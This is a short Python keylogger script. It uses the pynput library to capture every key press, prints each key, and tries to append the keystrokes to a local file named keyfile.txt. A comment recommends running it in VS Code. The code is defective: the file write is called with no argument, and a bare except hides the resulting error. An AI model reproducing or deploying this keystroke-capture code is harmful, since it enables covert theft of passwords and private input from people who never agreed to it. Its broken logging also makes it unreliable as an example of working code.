#Please run the code on VS Code instead of PyCharm. VS Code works perfectly.


from pynput import keyboard

def keypressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write()
        except:
            print("Error")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keypressed)
    listener.start()
    input()

